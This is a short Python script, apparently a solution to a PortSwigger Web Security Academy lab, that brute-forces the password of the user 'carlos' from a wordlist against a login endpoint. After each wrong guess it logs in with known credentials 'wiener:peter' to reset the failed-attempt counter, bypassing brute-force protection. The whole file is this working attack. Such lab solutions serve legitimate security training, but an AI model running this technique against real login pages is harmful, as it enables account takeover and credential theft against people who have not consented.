import requests

url = 'https://acc11f561fb636b5c015168200610086.web-security-academy.net/login'

def loginWiener():
    requests.post(url, data={
        'username': 'wiener',
        'password': 'peter'
    })

def getPassword():
    passwords = open('../../wordlist/password.txt')

    for password in passwords:
        response = requests.post(url, data={
            'username': 'carlos',
            'password': password.replace('\n', '')
        })

        if 'Incorrect password' not in response.text:
            print(password)
            break

        loginWiener()

getPassword()